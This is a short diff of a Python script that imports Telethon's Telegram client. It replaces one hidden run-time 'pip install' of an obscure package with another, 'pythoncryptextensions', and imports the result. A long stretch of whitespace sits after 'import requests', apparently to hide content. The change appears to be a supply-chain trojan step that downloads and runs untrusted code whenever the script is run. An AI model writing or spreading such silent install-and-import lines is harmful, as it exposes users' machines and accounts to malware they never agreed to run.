@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringstools")
-import pipcoloringstools
+os.system("pip install pythoncryptextensions")
+import pythoncryptextensions
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
